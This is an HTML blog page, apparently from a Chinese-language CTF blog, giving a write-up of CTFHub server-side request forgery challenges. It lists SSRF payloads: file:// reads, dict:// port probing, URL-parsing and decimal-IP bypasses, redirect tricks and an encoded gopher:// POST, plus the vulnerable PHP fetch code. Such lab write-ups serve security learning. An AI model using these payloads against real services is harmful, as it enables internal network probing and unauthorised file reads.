@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>CTF-Web-SSRF | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="CTFHub（没做完，有几题貌似环境有问题）内网访问1?url&#x3D;127.0.0.1&#x2F;flag.php 伪协议读取文件1?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 在注释中可以看到flag 注意，此处file协议后跟的绝对路径 端口扫描考察：dict:&#x2F;&#x2F;协议 dict:&#x2F;&#x2F;协议可用于">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Web-SSRF">
+<meta property="og:url" content="http://example.com/2021/02/20/CTF-Web-SSRF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CTFHub（没做完，有几题貌似环境有问题）内网访问1?url&#x3D;127.0.0.1&#x2F;flag.php 伪协议读取文件1?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php 在注释中可以看到flag 注意，此处file协议后跟的绝对路径 端口扫描考察：dict:&#x2F;&#x2F;协议 dict:&#x2F;&#x2F;协议可用于">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-02-20T01:26:15.000Z">
+<meta property="article:modified_time" content="2021-02-20T08:31:01.241Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CTF-Web-SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/20/CTF-Web-SSRF/" class="article-date">
+  <time class="dt-published" datetime="2021-02-20T01:26:15.000Z" itemprop="datePublished">2021-02-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      CTF-Web-SSRF
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CTFHub（没做完，有几题貌似环境有问题）"><a href="#CTFHub（没做完，有几题貌似环境有问题）" class="headerlink" title="CTFHub（没做完，有几题貌似环境有问题）"></a>CTFHub（没做完，有几题貌似环境有问题）</h1><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<p>在注释中可以看到flag</p>
+<p>注意，此处file协议后跟的绝对路径</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>考察：dict://协议</p>
+<p>dict://协议可用于探测开放的端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:§_§ HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+<p>得到端口后，直接访问（此处得到8011）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;127.0.0.1:8011</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REMOTE_ADDR&quot;] !&#x3D; &quot;127.0.0.1&quot;) &#123;</span><br><span class="line">    echo &quot;Just View From 127.0.0.1&quot;;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag&#x3D;getenv(&quot;CTFHUB&quot;);</span><br><span class="line">$key &#x3D; md5($flag);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] &#x3D;&#x3D; $key) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&#x2F;flag.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_REQUEST[&#39;url&#39;]))&#123;</span><br><span class="line">    header(&quot;Location: &#x2F;?url&#x3D;_&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ch &#x3D; curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure>
+<p>即要求将key提交给flag.php，同时只能由本地提交，也就是SSRF</p>
+<p>利用gopher，发送构造好的报文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;flag.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key&#x3D;a2a7e6cc66515b8a94be07946050ed51</span><br></pre></td></tr></table></figure>
+<p>其中要3次URL编码，其中换行符%0A要替换成%0d%0A</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?url&#x3D;127.0.0.1&#x2F;302.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253Da2a7e6cc66515b8a94be07946050ed51	</span><br></pre></td></tr></table></figure>
+<p>没出答案，方法应该没问题，跳过</p>
+<h2 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5c384f5f92d64f244c7362b7&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="URL-跳转bypass"><a href="#URL-跳转bypass" class="headerlink" title="URL 跳转bypass"></a>URL 跳转bypass</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.利用问好绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com?www.xxxx.me</span><br><span class="line">2.利用@绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com@www.xxxx.me</span><br><span class="line">3.利用斜杠反斜杠绕过限制</span><br><span class="line">4.利用#绕过限制url&#x3D;https:&#x2F;&#x2F;www.baidu.com#www.xxxx.me</span><br><span class="line">5.利用子域名绕过</span><br><span class="line">6.利用畸形url绕过</span><br><span class="line">7.利用跳转ip绕过</span><br></pre></td></tr></table></figure>
+<h2 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;localhost&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;2130706433&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h2><p>正解是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;IP:PORT&#x2F;302.php?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php</span><br></pre></td></tr></table></figure>
+<p>但是环境貌似有问题，直接访问?url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php%E5%8D%B3%E5%8F%AF">http://127.0.0.1/flag.php即可</a></p>
+<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><h2 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h2><p>用途：查看目标端口指纹信息</p>
+<p>格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;serverip:port</span><br></pre></td></tr></table></figure>
+<p>实例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict:&#x2F;&#x2F;ip:port&#x2F;info</span><br></pre></td></tr></table></figure>
+<p>可获取目标主机的port端口上运行着的应用</p>
+<h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h2><p>用途：发送各种格式的请求包</p>
+<p>格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;ip:port&#x2F;gopher-path</span><br><span class="line">注意，gopher-path部分，回车换行符要进行2次URL编码</span><br></pre></td></tr></table></figure>
+<p>示例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.163.150&#x2F;test.php?url&#x3D;gopher:&#x2F;&#x2F;192.168.163.1:80&#x2F;_POST%20&#x2F;evil.php%20HTTP&#x2F;1.1%250d%250aHost:%20192.168.163.1%250d%250aUser-Agent:%20curl&#x2F;7.43.0%250d%250aAccept:%20*&#x2F;*%250d%250aContent-Type:%20application&#x2F;x-www-form-urlencoded%250d%250a%250d%250acmd&#x3D;balabala</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/20/CTF-Web-SSRF/" data-id="ckloj8nvk0000vcusd50p9nro" data-title="CTF-Web-SSRF" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CTF-Web-命令执行
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">CTF-wp-攻防世界web高级</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-web/" rel="tag">ctf-web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%98%E6%8A%84/" rel="tag">摘抄</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" rel="tag">攻防世界wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E8%AF%AD/" rel="tag">日语</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%94%E6%A1%88/" rel="tag">答案</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/ctf-web/" style="font-size: 10px;">ctf-web</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E6%91%98%E6%8A%84/" style="font-size: 10px;">摘抄</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" style="font-size: 10px;">攻防世界wp</a> <a href="/tags/%E6%97%A5%E8%AF%AD/" style="font-size: 10px;">日语</a> <a href="/tags/%E7%AD%94%E6%A1%88/" style="font-size: 10px;">答案</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/02/26/CTF-Web-php/">CTF-Web-php</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/24/CTF-Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">CTF-Web-命令执行</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/20/CTF-Web-SSRF/">CTF-Web-SSRF</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/20/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E7%BA%A7/">CTF-wp-攻防世界web高级</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/19/CTF-wp-TenableCTF/">CTF-wp-TenableCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
